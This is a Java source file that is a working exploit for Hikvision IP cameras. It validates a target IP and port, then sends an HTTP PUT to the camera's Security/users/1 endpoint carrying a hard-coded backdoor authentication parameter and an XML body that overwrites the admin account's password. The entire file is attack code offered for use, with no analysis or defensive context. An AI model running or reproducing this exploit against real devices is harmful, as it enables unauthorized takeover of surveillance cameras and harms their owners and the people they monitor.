package HIKVISIONIPCAMEXPLOIT;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class mainClass {
	static String BackdoorAuthArg = "auth=YWRtaW46MTEK"; //BACKDOOR
	static String ip = "";
	static int port = 0;
	static String SSL = "";
	static String userID = "";
	static String userName = "";
	public static Pattern p = Pattern.compile("^(([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\.){3}([01]?\\d\\d?|2[0-4]\\d|25[0-5])$");
	static String protocol = "";
	static String newPassword= "";
	public static void main(String args[]) throws IOException {
		try {
			ip = args[0];
			port = Integer.parseInt(args[1]) ;
			SSL = args[2];
			newPassword= args[3];
			 Matcher m = p.matcher(ip);
			 if(m.matches()) {
				if((port < 65535)) {
					runExploit();
				}else{
					System.out.println("The entered port address" + port + " is not A valid port.");
				}
			 }else {
				 System.out.println("The entered ip address" + ip + " is not in the correct format.");
				 System.exit(0);
			 }
		}catch(Exception e) {
			System.out.println("Bad arguments!");
			System.exit(0);
		}
	}
	public static void runExploit() throws IOException {
		if(SSL.equals("Y")) {
			protocol = "https://";
		}else {
			protocol = "http://";
		}
		String URLBase = protocol + ip + ":" + port + "/";
		String PUTURL = URLBase + "Security/users/1?" + BackdoorAuthArg;
		
		putRequest(PUTURL,newPassword);
		System.out.println("Password for user \"admin\" should be changed to: " + newPassword);
	}
	public static void putRequest(String urlBuilt, String password) throws IOException {
		URL url = new URL(urlBuilt);
		HttpURLConnection httpCon = (HttpURLConnection) url.openConnection();
		httpCon.setDoOutput(true);
		httpCon.setRequestMethod("PUT");
		OutputStreamWriter out = new OutputStreamWriter(
		    httpCon.getOutputStream());
		out.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" + 
				"<User xmlns=\"http://www.hikvision.com/ver10/XMLSchema\" version=\"1.0\">\r\n" + 
				"   <id>1</id>\r\n" + 
				"   <userName>admin</userName>\r\n" + 
				"   <password>"+password+"</password>\r\n" + 
				"</User>");
		out.close();
		httpCon.getInputStream();
	}
}
